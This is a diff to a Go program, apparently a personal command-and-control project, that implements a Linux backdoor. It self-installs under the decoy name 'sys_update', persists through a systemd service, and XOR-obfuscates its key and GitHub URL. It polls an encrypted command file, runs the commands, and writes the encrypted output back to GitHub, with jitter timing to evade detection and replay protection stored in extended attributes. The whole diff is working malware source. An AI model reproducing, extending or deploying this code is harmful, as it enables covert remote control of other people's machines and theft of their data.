@@ -1,18 +1,17 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"encoding/base64"
-	"encoding/hex"
+	"c2project/encryption"
+	"c2project/github"
 	"fmt"
-	"io"
-	"math/rand"
-	"net/http"
+	"math/rand/v2"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 	"time"
+
+	"golang.org/x/sys/unix"
 )
 
 var xorKey = []byte{0xAF, 0x22, 0xC3, 0x11}  // xor mask
@@ -26,9 +25,10 @@ var scrambledKey = []byte{0x99, 0x15, 0xf5, 0x28, 0x9d, 0x15, 0xa7, 0x24, 0x9f, 
 // this is a simple XOR-obfuscated version of the url (using xorKey2) to the command file on github to obfuscate the url in a compiled binary
 var scrambledCmdURL = []byte{0x32, 0x48, 0xa, 0xed, 0x29, 0x6, 0x51, 0xb2, 0x28, 0x5d, 0x9, 0xb3, 0x3d, 0x55, 0xa, 0xf5, 0x2f, 0x5e, 0xb, 0xee, 0x3f, 0x4e, 0x1d, 0xf2, 0x34, 0x48, 0x1b, 0xf3, 0x2e, 0x12, 0x1d, 0xf2, 0x37, 0x13, 0x2d, 0xe8, 0x28, 0x5d, 0x17, 0xf3, 0x9, 0x5d, 0x17, 0xfa, 0x3b, 0x50, 0x51, 0xfe, 0x68, 0x11, 0xe, 0xef, 0x35, 0x56, 0x1b, 0xfe, 0x2e, 0x11, 0x1b, 0xe9, 0x32, 0x55, 0x1d, 0xfc, 0x36, 0x13, 0xc, 0xf8, 0x3c, 0x4f, 0x51, 0xf5, 0x3f, 0x5d, 0x1a, 0xee, 0x75, 0x51, 0x1f, 0xf4, 0x34, 0x13, 0x1d, 0xf2, 0x37, 0x51, 0x1f, 0xf3, 0x3e, 0x4f, 0x50, 0xe9, 0x22, 0x48}
 
+const targetPath = "/usr/local/bin/sys_update" // where we want the binary to actually be (decoy name)
+
 func main() {
 	curPath, _ := os.Executable()
-	targetPath := "/usr/local/bin/sys_update" // this is where we want the backdoor to actually be located (sys_update is a decoy name)
 
 	if curPath != targetPath { // we haven't installed ourself yet
 
@@ -52,7 +52,7 @@ func main() {
 	}
 }
 
-// create a service that will automatically restart the backdoor if it's killed, and more importantly, will make it run on startup to maintain persistence
+// create a service that will automatically restart the backdoor if it's killed, and more importantly, will make it run on startup to maintain persistence across reboots
 func StartService(binPath string) error {
 	servicePath := "/etc/systemd/system/sys_update.service"
 
@@ -84,23 +84,44 @@ WantedBy=multi-user.target
 	return nil
 }
 
-// This is the backdoor loop that continuously fetches the command file, decrypts it, executes the commands, and writes the output back to github. It includes a random delay to avoid pattern detection. We only run once the binary has "self-installed" itself on the target machine.
+// This is the backdoor loop that continuously fetches the command file, decrypts it, executes the commands, and writes the output back to github. It includes a random delay to avoid periodicity detection. We only run once the binary has "self-installed" itself on the target machine.
 func BackdoorLoop() {
 	key, cmdURL := string(XORTransform(scrambledKey, xorKey)), string(XORTransform(scrambledCmdURL, xorKey2))
 	for {
-		commandEncrypted, err := FetchCommandFileFromGitHub(cmdURL)
+		lastCommandTime := GetLastCommandTime()
+
+		commandEncrypted, err := github.ReadFile(cmdURL)
 		if err != nil {
 			fmt.Println("Error fetching command file:", err)
 			return
 		}
 
-		commandStr, err := DecryptString(commandEncrypted, key)
+		commandUnencrypted, err := encryption.DecryptString(commandEncrypted, key)
 		if err != nil {
 			fmt.Println("Error decrypting command:", err)
 			return
 		}
 
-		commands := strings.Split(commandStr, "\n")
+		data := strings.Split(commandUnencrypted, "|")
+		if len(data) != 2 {
+			fmt.Println("Invalid command format")
+			return
+		}
+
+		timestampStr := data[0]
+		timestamp, err := strconv.ParseInt(timestampStr, 10, 64)
+		if err != nil {
+			fmt.Println("Error parsing timestamp:", err)
+			return
+		}
+
+		if timestamp == lastCommandTime {
+			// no new command, sleep and check again later
+			SleepWithJitter()
+			continue
+		}
+
+		commands := strings.Split(data[1], "\n")
 		outputs := make([]string, 0, len(commands))
 
 		// run each command and store the output
@@ -118,82 +139,21 @@ func BackdoorLoop() {
 			outputs = append(outputs, string(output))
 		}
 
-		// append outputs to a file
-		outputContent := strings.Join(outputs, "\n")
-		err = os.WriteFile("/tmp/cmd_output.txt", []byte(outputContent), 0644)
+		SetLastCommandTime(timestamp)
+
+		// encrypt
+		outputCombined := strings.Join(outputs, "\n")
+		outputEncrypted, err := encryption.EncryptString(outputCombined, key)
 		if err != nil {
-			fmt.Println("Error writing output file:", err)
+			fmt.Println("Error encrypting output:", err)
 			return
 		}
 
-		time.Sleep(time.Second * time.Duration((60 + (rand.Intn(21) - 10)))) // 50-70s, random delay to avoid periodicity detection
+		// write back to github (overwrite the command file with the encrypted output)
+		err = github.WriteFile("commands.txt", commandEncrypted, outputEncrypted)
+
+		SleepWithJitter() // go dark for a period before checking for new commands again
 	}
-}
-
-// Fetches encrypted command file from github
-func FetchCommandFileFromGitHub(commandsUrl string) (string, error) {
-	resp, err := http.Get(commandsUrl)
-	if err != nil {
-		fmt.Println("Error fetching file:", err)
-		return "", err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		fmt.Println("Failed to fetch file. Status:", resp.Status)
-		return "", fmt.Errorf("failed to fetch file: %s", resp.Status)
-	}
-
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Println("Error reading response:", err)
-		return "", err
-	}
-
-	return string(body), nil
-}
-
-// takes base64 ciphertext and hex key, return decrypted plaintext using AES-GCM
-func DecryptString(cryptoText string, keyHex string) (string, error) {
-	// decode key into bytes
-	key, err := hex.DecodeString(keyHex)
-	if err != nil || len(key) != 32 {
-		return "", fmt.Errorf("invalid key: must be 32 bytes")
-	}
-
-	// decode base64 ciphertext
-	ciphertext, err := base64.StdEncoding.DecodeString(cryptoText)
-	if err != nil {
-		return "", fmt.Errorf("base64 decode failed: %v", err)
-	}
-
-	// initialize cipher
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return "", err
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return "", err
-	}
-
-	// remove nonce
-	nonceSize := gcm.NonceSize()
-	if len(ciphertext) < nonceSize {
-		return "", fmt.Errorf("ciphertext too short")
-	}
-
-	nonce, actualCiphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
-
-	// decrypt
-	plaintext, err := gcm.Open(nil, nonce, actualCiphertext, nil)
-	if err != nil {
-		// will fail if wrong key or tampered ciphertext
-		return "", fmt.Errorf("decryption/auth failed: %v", err)
-	}
-
-	return string(plaintext), nil
 }
 
 // XORTransform toggles the bits. Running it twice restores the original.
@@ -204,4 +164,34 @@ func XORTransform(input []byte, key []byte) []byte {
 		output[i] = input[i] ^ key[i%len(key)]
 	}
 	return output
+}
+
+func SleepWithJitter() {
+	time.Sleep(time.Second * time.Duration((60 + (rand.IntN(21) - 10)))) // random delay between 50-70 seconds
+}
+
+// reads last command time from the xaddr attribute of the binary, so we don't repeat commands (and are immune to replay attacks)
+func GetLastCommandTime() int64 {
+	dest := make([]byte, 100)
+
+	// read the attribute
+	sz, err := unix.Getxattr(targetPath, "user.last_command_time", dest)
+	if err != nil {
+		// if the attribute doesn't exist yet (first run), return 0
+		return 0
+	}
+
+	// sz is the exact number of bytes returned. We slice the buffer to that size.
+	savedTime, err := strconv.ParseInt(string(dest[:sz]), 10, 64)
+	if err != nil {
+		return 0 // Return 0 if the data got corrupted
+	}
+
+	return savedTime
+}
+
+// writes last command time to the xaddr attribute of the binary
+func SetLastCommandTime(timestamp int64) {
+	timeStr := strconv.FormatInt(timestamp, 10)
+	unix.Setxattr(targetPath, "user.last_command_time", []byte(timeStr), 0)
 }
